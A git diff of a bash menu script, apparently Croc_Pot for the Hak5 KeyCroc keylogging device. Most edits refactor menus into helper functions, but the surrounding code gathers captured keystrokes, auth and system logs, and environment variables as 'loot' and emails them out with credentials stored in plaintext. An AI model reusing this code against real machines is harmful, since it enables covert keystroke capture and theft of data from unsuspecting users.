@@ -61,31 +61,42 @@ ColorRed() {
 }
 
 ##
+# All Menu color Functions
+##
+
+MenuTitle() {
+	echo -ne "\t\t\t\e[41;4;1m${1} ${2} ${3} ${4} ${5}${clear}\n"
+}
+
+MenuColor() {
+    echo -ne "\t\t\t\e[40;1m${1}${clear}${green})${clear}\e[40;38;5;202;4m${2} ${3} ${4} ${5} ${6} ${7}${clear}\n"
+}
+
+MenuEnd() {
+	echo -ne "\t\t\t\e[40;1m0${clear}${green})${clear}\e[40;4;32mEXIT              ${clear}
+\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
+}
+
+##
 # Payload Functions
 ##
 
-croc_title() {
+function croc_title() {
 	echo -ne "\n\n\e[41;30m${LINE}${clear}
 \e[40;31m${LINE_A}${clear}\e[40m>${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m5${clear}\e[40m<${clear}\e[40;31m${LINE_A}${clear}\e[40m${yellow}KeyCroc IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)           ${clear}
 \e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40;92m/${clear}\e[40m ROOTJUNKY         ${clear}\e[40m${yellow}KeyCroc VER: $(cat /root/udisk/version.txt)                ${clear}
 \e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}     ${clear}\e[40m${yellow}KeyCroc keyboard: $(sed -n 9p /root/udisk/config.txt)     ${clear}
 \e[40;31m${LINE_A}${clear}\e[40;92m>CROC_POT<\e[40;31m${LINE_A}    ${clear}\e[40m${yellow}VER:1.0                             ${clear}
-\e[41;30m${LINE}${clear}\n\n
-\n
-"	
+\e[41;30m${LINE}${clear}\n\n\n"	
 }
 
-croc_title_loot() {
-    echo ""
-    echo -e "${LINE}\n\t${LINE_A}>KEYCROC-HAK5<${LINE_A}\n\t\tDEVELOPED BY SPYWILL / ROOTJUNKY\n\t\tDATE OF SCAN-${DATE}\n\t${LINE_A}>CROC_POT<${LINE_A}\n${LINE}\n" 
-    echo ""
+function croc_title_loot() {
+    echo -e "\n${LINE}\n\t${LINE_A}>KEYCROC-HAK5<${LINE_A}\n\t\tDEVELOPED BY SPYWILL / ROOTJUNKY\n\t\tDATE OF SCAN-${DATE}\n\t${LINE_A}>CROC_POT<${LINE_A}\n${LINE}\n\n"
 }
 
-invalid_entry() {
+function invalid_entry() {
     LED R
-    echo ""
-    echo -e ${LINE_}"\e[40;5m$(ColorRed 'INVALID ENTRY PLEASE TRY AGAIN')${clear}"${LINE_}
-    echo ""
+    echo -e "\t\n${LINE_}\e[40;5m$(ColorRed 'INVALID ENTRY PLEASE TRY AGAIN')${clear}${LINE_}\n"
 }
 
 ##
@@ -104,22 +115,16 @@ function nmap_menu() {
 ##	
 	
 user_ip_f() {
-	echo ""
 	read -p "$(ColorBlue 'ENTER IP TO USE FOR NMAP SCAN AND PRESS [ENTER]'): " USER_IP
-	echo ""
 	LED B
 	if [[ "${USER_IP}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
 	LED B
 	IP_SETUP=${USER_IP}
-	echo ""
 	echo -e \t${LINE_}"\e[40m$(ColorGreen 'USING IP THAT WAS ENTER')${clear}" ${IP_SETUP}
-	echo ""
 else
 	LED R
-	echo ""
 	echo -e \t${LINE_}"\e[40;4m$(ColorRed 'USING DEFAULT IP 192.168.1*')${clear}"${LINE_}
 	IP_SETUP=192.168.1.*
-	echo ""
 fi
 }
  
@@ -198,7 +203,6 @@ port_scan() {
 
 personal_scan() {
 	 LED ATTACK
-	 user_ip_f
 	 croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PERSONAL SCAN${LINE_}\n" ; echo -n " $(ColorBlue 'ENTER YOUR NMAP SCAN SETTING THEN PRESS [ENTER]'): " ; read PER_SCAN && ${PER_SCAN} | tee -a ${LOOT_NMAP}
 }
 
@@ -226,20 +230,18 @@ fi
 ##
  
 LED B	
-echo -ne "
-\t\t\e[40;91;1m${LINE_}${clear}\e[40;4;1mNMAP MENU${clear}\e[40;91;1m${LINE_}${clear}
-\t\t\t\e[40;1m 1${clear}${green})${clear}\e[41;4;30mREGULAR SCAN       ${clear}
-\t\t\t\e[40;1m 2${clear}${green})${clear}\e[41;4;30mQUICK SCAN         ${clear}
-\t\t\t\e[40;1m 3${clear}${green})${clear}\e[41;4;30mQUICK PLUS         ${clear}
-\t\t\t\e[40;1m 4${clear}${green})${clear}\e[41;4;30mPING SCAN          ${clear}
-\t\t\t\e[40;1m 5${clear}${green})${clear}\e[41;4;30mINTENSE SCAN       ${clear}
-\t\t\t\e[40;1m 6${clear}${green})${clear}\e[41;4;30mINTERFACE SCAN     ${clear}
-\t\t\t\e[40;1m 7${clear}${green})${clear}\e[41;4;30mPORT SCAN          ${clear}
-\t\t\t\e[40;1m 8${clear}${green})${clear}\e[41;4;30mPERSONAL SCAN      ${clear}
-\t\t\t\e[40;1m 9${clear}${green})${clear}\e[41;4;30mCONNECTED PC SCAN  ${clear}
-\t\t\t\e[40;1m10${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU${clear}
-\t\t\t\e[40;1m 0${clear}${green})${clear}\e[41;4;93;4;1mEXIT               ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
+MenuTitle NMAP MENU
+MenuColor  1 REGULAR SCAN______
+MenuColor  2 QUICK SCAN________
+MenuColor  3 QUICK PLUS________
+MenuColor  4 PING SCAN_________
+MenuColor  5 INTENSE SCAN______
+MenuColor  6 INTERFACE SCAN____
+MenuColor  7 PORT SCAN_________
+MenuColor  8 PERSONAL SCAN_____
+MenuColor  9 CONNECTED PC SCAN__
+MenuColor 10 RETURN TO MAIN MENU
+MenuEnd
         read d
         case $d in
         1) regular_scan ; nmap_menu ;;
@@ -265,45 +267,43 @@ function croc_logs_mean() {
 	LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
 	LED B
 	croc_title
-echo -ne "
-\t\t\e[40;91;1m${LINE_}${clear}\e[40;4;1mKEYCROC LOG MENU${clear}\e[40;91;1m${LINE_}${clear}
-\t\t\t\e[40;1m 1${clear}${green})${clear}\e[41;4;30mMESSAGES LOG       ${clear}
-\t\t\t\e[40;1m 2${clear}${green})${clear}\e[41;4;30mKERNEL LOG         ${clear}
-\t\t\t\e[40;1m 3${clear}${green})${clear}\e[41;4;30mSYSTEM LOG         ${clear}
-\t\t\t\e[40;1m 4${clear}${green})${clear}\e[41;4;30mSYSSTAT LOG        ${clear}
-\t\t\t\e[40;1m 5${clear}${green})${clear}\e[41;4;30mDEBUG LOG          ${clear}
-\t\t\t\e[40;1m 6${clear}${green})${clear}\e[41;4;30mDPKG LOG           ${clear}
-\t\t\t\e[40;1m 7${clear}${green})${clear}\e[41;4;30mNTPSTATS LOG       ${clear}
-\t\t\t\e[40;1m 8${clear}${green})${clear}\e[41;4;30mAUTH LOG           ${clear}
-\t\t\t\e[40;1m 9${clear}${green})${clear}\e[41;4;30mDMESG LOG          ${clear}
-\t\t\t\e[40;1m10${clear}${green})${clear}\e[41;4;30mBOOTSTRAP LOG      ${clear}
-\t\t\t\e[40;1m11${clear}${green})${clear}\e[41;4;30mALTERNATIVES LOG   ${clear}
-\t\t\t\e[40;1m12${clear}${green})${clear}\e[41;4;30mMAIL INFO LOG      ${clear}
-\t\t\t\e[40;1m13${clear}${green})${clear}\e[41;4;30mDAEMON LOG         ${clear}
-\t\t\t\e[40;1m14${clear}${green})${clear}\e[41;4;30mKEYSTROKES LOG     ${clear}
-\t\t\t\e[40;1m15${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU${clear}
-\t\t\t\e[40;1m 0${clear}${green})${clear}\e[41;4;93;4;1mEXIT               ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
+MenuTitle KEYCROC LOG MENU
+MenuColor  1 MESSAGES LOG______
+MenuColor  2 KERNEL LOG________
+MenuColor  3 SYSTEM LOG________
+MenuColor  4 SYSSTAT LOG_______
+MenuColor  5 DEBUG LOG_________
+MenuColor  6 DPKG LOG__________
+MenuColor  7 NTPSTATS LOG______
+MenuColor  8 AUTH LOG__________
+MenuColor  9 DMESG LOG_________
+MenuColor 10 BOOTSTRAP LOG____
+MenuColor 11 ALTERNATIVES LOG_
+MenuColor 12 MAIL INFO LOG_____
+MenuColor 13 DAEMON LOG_______
+MenuColor 14 KEYSTROKES LOG___
+MenuColor 15 RETURN TO MAIN MENU
+MenuEnd
         read e
         case $e in
-	      1) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MESSAGES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/messages | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-        2) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KERNEL_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/kern.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-        3) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}SYSTEM_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/syslog | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-        4) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}SYSSTAT_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/sysstat | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-        5) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DEBUG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/debug | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-        6) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DPKG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/dpkg.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-        7) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}NTPSTATS_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/ntpstats | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-        8) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}AUTH_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/auth.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-        9) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DMESG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; echo -e "$(dmesg)" | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-	      10) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}BOOTSTRAP_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/bootstrap.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-	      11) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}ALTERNATIVES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/alternatives.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-	      12) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MAIL_INFO_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/mail.info | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-	      13) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DAEMON_LOG${LINE_}\n" | tee ${LOOT_LOG} ; cat /var/log/daemon.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-	      14) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KEYSTROKES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /root/udisk/loot/croc_char.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
-	      15) main_menu ;;
-	      0) exit 0 ;;
-	      *) invalid_entry ; croc_logs_mean ;;
-	    esac
+    1) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MESSAGES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/messages | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+    2) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KERNEL_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/kern.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+    3) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}SYSTEM_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/syslog | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+    4) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}SYSSTAT_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/sysstat | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+    5) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DEBUG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/debug | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+    6) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DPKG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/dpkg.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+    7) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}NTPSTATS_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/ntpstats | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+    8) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}AUTH_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/auth.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+    9) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DMESG_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; echo -e "$(dmesg)" | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+   10) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}BOOTSTRAP_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/bootstrap.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+   11) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}ALTERNATIVES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/alternatives.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+   12) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}MAIL_INFO_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /var/log/mail.info | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+   13) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}DAEMON_LOG${LINE_}\n" | tee ${LOOT_LOG} ; cat /var/log/daemon.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+   14) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KEYSTROKES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /root/udisk/loot/croc_char.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
+   15) main_menu ;;
+    0) exit 0 ;;
+    *) invalid_entry ; croc_logs_mean ;;
+	esac
 }
 
 ##
@@ -313,7 +313,6 @@ echo -ne "
 function croc_mail() {
 	PYTHON_MAIL=/root/udisk/tools/Croc_Pot/Croc_Mail.py
 	USER_CR=/root/udisk/tools/Croc_Pot/user_email.txt
-	rm -f ${PYTHON_MAIL}
 	LED B
 	croc_title
 echo -ne "$(ColorYellow '
@@ -331,13 +330,11 @@ Enter ATTACHMENT yes or no when do e-mail will be sent and back to menu\n
 ##
 
 user_smtp() {
-echo -ne -e " 
-\t\t\e[40;91;1m${LINE_}${clear}\e[40;4;1mSELECT EMAIL PROVIDER${clear}\e[40;91;1m${LINE_}${clear}
-\t\t\t\e[40;1m1${clear}${green})${clear}\e[41;4;30mGMAIL              ${clear}
-\t\t\t\e[40;1m2${clear}${green})${clear}\e[41;4;30mOUTLOOK            ${clear}
-\t\t\t\e[40;1m3${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU${clear}
-\t\t\t\e[40;1m0${clear}${green})${clear}\e[41;4;93;4;1mEXIT               ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
+MenuTitle SELECT EMAIL PROVIDER
+MenuColor 1 GMAIL___________
+MenuColor 2 OUTLOOK_________
+MenuColor 3 RETURN TO MAIN MENU
+MenuEnd
         read mail
         case $mail in
         1) GMAIL=smtp.gmail.com ; echo ${GMAIL} >> ${USER_CR} ;;
@@ -376,9 +373,7 @@ echo ""
 
 LED SETUP
 read -p "$(ColorBlue 'ENTER YOUR EMAIL AND PRESS [ENTER]:') " E_MAIL_MY ; echo ${E_MAIL_MY} >> ${USER_CR}
-echo ""
 user_input_passwd
-echo ""
 read -p "$(ColorBlue 'ENTER EMAIL TO SEND LOOT TO AND PRESS [ENTER]:') " E_MAIL_SEND ; echo ${E_MAIL_SEND} >> ${USER_CR}  
 }
 
@@ -499,26 +494,24 @@ fi
 #   - Croc Mail Select File Menu
 ##
 		
-echo -ne " 
-\t\t\e[40;91;1m${LINE_}${clear}\e[40;4;1mSELECT FILE TO E-MAIL${clear}\e[40;91;1m${LINE_}${clear}
-\t\t\t\e[40;1m1${clear}${green})${clear}\e[41;4;30mNMAP SCAN          ${clear}
-\t\t\t\e[40;1m2${clear}${green})${clear}\e[41;4;30mKEYCROC LOG        ${clear} 
-\t\t\t\e[40;1m3${clear}${green})${clear}\e[41;4;30mWINDOW SCAN        ${clear}
-\t\t\t\e[40;1m4${clear}${green})${clear}\e[41;4;30mKEYCROC INFO       ${clear}
-\t\t\t\e[40;1m5${clear}${green})${clear}\e[41;4;30mADD ATTACHMENT     ${clear}
-\t\t\t\e[40;1m6${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU${clear}
-\t\t\t\e[40;1m0${clear}${green})${clear}\e[41;4;93;4;1mEXIT               ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:')     ${clear}"
+MenuTitle SELECT FILE TO E-MAIL
+MenuColor 1 NMAP SCAN________
+MenuColor 2 KEYCROC LOG______
+MenuColor 3 WINDOW SCAN______
+MenuColor 4 KEYCROC INFO_____
+MenuColor 5 ADD ATTACHMENT___
+MenuColor 6 RETURN TO MAIN MENU
+MenuEnd
         read mail_A
         case $mail_A in
-	      1) send_file_a ;;
-	      2) send_file_b ;;
+	1) send_file_a ;;
+	2) send_file_b ;;
         3) send_file_c ;;
         4) send_file_d ;;
         5) send_file_e ;;
         6) main_menu ;;
         0) exit 0 ;;
-	      *) invalid_entry ; mail_file ;;
+	    *) invalid_entry ; mail_file ;;
         esac
    }
   
@@ -532,7 +525,7 @@ USER_EMAL=$(sed -n 2p ${USER_CR})
 USER_PASSWD=$(sed -n 3p ${USER_CR})
 USER_SEND=$(sed -n 4p ${USER_CR})
 USER_SMTP=$(sed -n 1p ${USER_CR})
-rm -f ${PYTHON_MAIL}
+rm ${PYTHON_MAIL}
 LED SETUP
 sleep 1
 echo -ne "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.base import MIMEBase\nfrom email import encoders\nimport os.path\n\nemail = '${USER_EMAL}'\npassword = '${USER_PASSWD}'\nsend_to_email = '${USER_SEND}'\n
@@ -546,17 +539,14 @@ sleep 1
 python ${PYTHON_MAIL}
 LED FINISH
 sleep 1
-
 }
 
 if [ -e "${USER_CR}" ]; then
     LED B
-    echo ""
     echo -e "\e[40m$(ColorBlue 'WOULD YOU LIKE TO USE EXISTING EMAIL SETTING TYPE YES OR NO AND PRESS [ENTER]:')${clear} "; read EMAIL_SETTING
 	case $EMAIL_SETTING in
 	[yY] | [yY][eE][sS] )
 			    LED B
-			    echo ""
 			    echo -e ${LINE_}"\e[40m$(ColorGreen 'KEEPING EXISTING EMAIL SETTING')${clear}"${LINE_} ;;
 	    [nN] | [nN][oO] )
 			    LED SETUP
@@ -578,7 +568,6 @@ read -p "$(ColorBlue 'ENTER A PERSONAL MESSAGE YES OR NO AND PRESS [ENTER]:') " 
 	case $MAIL_MESS in
 	[yY] | [yY][eE][sS] )
 			    LED SETUP
-			    echo ""
 			    read -p "$(ColorBlue 'ENTER YOUR MESSAGE AND PRESS [ENTER]:') " MY_MESS ;;
 	    [nN] | [nN][oO] )
 			    LED B
@@ -655,16 +644,14 @@ user_tcpdump() {
 #   - Tcpdump Scan Menu
 ##
     
-echo -ne "
-\t\t\e[40;91;1m${LINE_}${clear}\e[40;4;1mTCPDUMP SCAN MENU${clear}\e[40;91;1m${LINE_}${clear}
-\t\t\t\e[40;1m1${clear}${green})${clear}\e[41;4;30mTCPDUMP INTERFACE SCAN          ${clear}
-\t\t\t\e[40;1m2${clear}${green})${clear}\e[41;4;30mTCPDUMP PACKETS IN HEX AND ASCll${clear}
-\t\t\t\e[40;1m3${clear}${green})${clear}\e[41;4;30mTCPDUMP PACKETS WITH IP ADDRESS ${clear}
-\t\t\t\e[40;1m4${clear}${green})${clear}\e[41;4;30mSCAN CURRENT NETWORK INTERFACE  ${clear}
-\t\t\t\e[40;1m5${clear}${green})${clear}\e[41;4;30mENTER AN TCPDUMP SCAN           ${clear}
-\t\t\t\e[40;1m6${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU             ${clear}
-\t\t\t\e[40;1m0${clear}${green})${clear}\e[41;4;93;4;1mEXIT                            ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:')        ${clear}"
+MenuTitle TCPDUMP SCAN MENU
+MenuColor 1 TCPDUMP INTERFACE SCAN_______
+MenuColor 2 TCPDUMP PACKETS IN HEX AND ASCll
+MenuColor 3 TCPDUMP PACKETS WITH IP ADDRESS
+MenuColor 4 SCAN CURRENT NETWORK INTERFACE
+MenuColor 5 ENTER AN TCPDUMP SCAN_________
+MenuColor 6 RETURN TO MAIN MENU___________
+MenuEnd
         read a_f
         case $a_f in
 	    1) interface_tcpdump ; tcpdump_scan ;;
@@ -673,9 +660,9 @@ echo -ne "
 	    4) current_tcpdump ; tcpdump_scan ;;
 	    5) user_tcpdump ; tcpdump_scan ;;
 	    6) main_menu ;;
-		  0) exit 0 ;;
-		  *) invalid_entry ; tcpdump_scan ;;
-		  esac
+	    0) exit 0 ;;
+	    *) invalid_entry ; tcpdump_scan ;;
+	    esac
 }
 
 ##
@@ -1026,12 +1013,18 @@ function croc_vpn() {
     vpn_file_A=/etc/openvpn/*.ovpn
     vpn_file=/root/udisk/*.ovpn
 
+setup_vpn() {
+echo -ne "\n\e[40;m$(ColorYellow '
+-First you will need to download the (filename.ovpn) file\n
+-from your VPN server of choice\n
+-place it on the keycroc root of the udisk\n
+-Then select #1 VPN SETUP to do the rest\n
+-This will check to see if openvpn is installed if not installing it')${clear}\n"
+
 ##
 #   - VPN Check/install openvpn
 ##
-
-setup_vpn() {
-	pkg_vpn=openvpn
+        pkg_vpn=openvpn
 	status_vpn="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg_vpn" 2>&1)"
 	if [ ! $? = 0 ] || [ ! "$status_vpn" = installed ]; then
 	apt install $pkg_vpn
@@ -1050,33 +1043,31 @@ setup_vpn() {
 	  sed -i 's/auth-user-pass/auth-user-pass \/etc\/openvpn\/credentials/g' ${vpn_file_A}
 	  openvpn --config ${vpn_file_A} --daemon
 else
-    echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'DID NOT FIND .ovpn FILE ON THE KEYCROC UDISK')${LINE_}${clear}"
-    fi
+          echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'DID NOT FIND .ovpn FILE ON THE KEYCROC UDISK')${LINE_}${clear}\n"
+      fi
 }
 
 ##
 #   - VPN Menu
 ##
 
-echo -ne -e " 
-\t\t\t\e[40;4;1mVPN MENU${clear}
-\t\t\t\e[40;1m1${clear}${green})${clear}\e[41;4;30mVPN SETUP          ${clear}
-\t\t\t\e[40;1m2${clear}${green})${clear}\e[41;4;30mENABLE VPN         ${clear}
-\t\t\t\e[40;1m3${clear}${green})${clear}\e[41;4;30mDISENABLE VPN      ${clear}
-\t\t\t\e[40;1m4${clear}${green})${clear}\e[41;4;30mVPN STATUS         ${clear}
-\t\t\t\e[40;1m5${clear}${green})${clear}\e[41;4;30mEDIT .OVPN FILE    ${clear}
-\t\t\t\e[40;1m6${clear}${green})${clear}\e[41;4;30mREMOVE VPN FILES   ${clear}
-\t\t\t\e[40;1m7${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU${clear}
-\t\t\t\e[40;1m0${clear}${green})${clear}\e[41;4;93;4;1mEXIT               ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
+MenuTitle VPN MENU
+MenuColor 1 VPN SETUP________
+MenuColor 2 ENABLE VPN_______
+MenuColor 3 DISENABLE VPN____
+MenuColor 4 VPN STATUS_______
+MenuColor 5 EDIT .OVPN FILE___
+MenuColor 6 REMOVE VPN FILES__
+MenuColor 7 RETURN TO MAIN MENU
+MenuEnd
         read mv
         case $mv in
         1) setup_vpn ; croc_vpn ;;
-        2) openvpn --config ${vpn_file_A} --daemon ; croc_vpn ;;
-        3) killall openvpn ; service openvpn restart ; croc_vpn ;;
+        2) openvpn --config ${vpn_file_A} --daemon ; echo -ne "\n\e[40;m$(ColorGreen 'ENABLE VPN CHECK VPN STATUS')${clear}\n" ; croc_vpn ;;
+        3) killall openvpn ; service openvpn restart ; echo -ne "\n\e[40;m$(ColorRed 'DISENABLE VPN CHECK VPN STATUS')${clear}\n" ; croc_vpn ;;
         4) service openvpn status ; route -n ; ifconfig ; croc_vpn ;;
-	      5) nano ${vpn_file_A} ; croc_vpn ;;
-        6) rm -f ${vpn_file_A} /etc/openvpn/credentials ${vpn_file} ; croc_vpn ;;
+	5) nano ${vpn_file_A} ; croc_vpn ;;
+        6) rm -f ${vpn_file_A} /etc/openvpn/credentials ${vpn_file} ; echo -ne "\n\e[40;m$(ColorRed '.OVPN AND CREDENTIALS FILES HAS BEEN REMOVED')${clear}\n" ; croc_vpn ;;
         7) main_menu ;;
         0) exit 0 ;;
         *) invalid_entry ;;
@@ -1089,19 +1080,17 @@ echo -ne -e "
 	
 menu_B() {
 	LED B
-echo -ne "
-\t\t\e[40;91;1m${LINE_}${clear}\e[40;4;1mCROC POT PLUS MENU${clear}\e[40;91;1m${LINE_}${clear}
-\t\t\t\e[40;1m1${clear}${green})${clear}\e[41;4;30mTCPDUMP SCAN                ${clear}
-\t\t\t\e[40;1m2${clear}${green})${clear}\e[41;4;30mKEYSTORKES LAPTOP (WINDOWS) ${clear}
-\t\t\t\e[40;1m3${clear}${green})${clear}\e[41;4;30mGETONLINE PAYLOAD (WINDOWS) ${clear} 
-\t\t\t\e[40;1m4${clear}${green})${clear}\e[41;4;30mCROCUNLOCK PAYLOAD (WINDOWS)${clear}
-\t\t\t\e[40;1m5${clear}${green})${clear}\e[41;4;30mWIFI SETUP PAYLOAD          ${clear}
-\t\t\t\e[40;1m6${clear}${green})${clear}\e[41;4;30mNMAP SCAN                   ${clear}
-\t\t\t\e[40;1m7${clear}${green})${clear}\e[41;4;30mWINDOWS INFO SCAN           ${clear}
-\t\t\t\e[40;1m8${clear}${green})${clear}\e[41;4;30mCROC VPN SETUP              ${clear}
-\t\t\t\e[40;1m9${clear}${green})${clear}\e[41;4;30mRETURN TO MAIN MENU         ${clear}
-\t\t\t\e[40;1m0${clear}${green})${clear}\e[41;4;93;4;1mEXIT                        ${clear}
-\t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:   ') ${clear}"
+MenuTitle CROC POT PLUS MENU
+MenuColor 1 TCPDUMP SCAN_____________
+MenuColor 2 KEYSTORKES LAPTOP WINDOWS_
+MenuColor 3 GETONLINE PAYLOAD WINDOWS_
+MenuColor 4 CROCUNLOCK PAYLOAD WINDOWS
+MenuColor 5 WIFI SETUP PAYLOAD________
+MenuColor 6 NMAP SCAN________________
+MenuColor 7 WINDOWS INFO SCAN_________
+MenuColor 8 CROC VPN SETUP____________
+MenuColor 9 RETURN TO MAIN MENU________
+MenuEnd
         read a_d
         case $a_d in
         1) tcpdump_scan ; menu_B ;;
@@ -1185,7 +1174,7 @@ all_checks() {
     rm -f ${LOOT_INFO}
     croc_title_loot >> ${LOOT_INFO}
 echo -ne "\t${LINE_}KEYCROC INFO${LINE_}\n${LINE}\nCROC FIRMWARE: $(cat /root/udisk/version.txt)\nKEYCROC CONFIG SETTING:\n$(sed -n '/^[DWS]/p' /root/udisk/config.txt)\n${LINE}\nUSER NAME: $(whoami)\nHOSTNAME: $(cat /proc/sys/kernel/hostname)
-IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nPUBLIC IP: $(curl ifconfig.co)\nMAC ADDRESS: $(cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address)\n${LINE}\nVARIABLES CURRENT USER:\n$(env)\n${LINE}\n
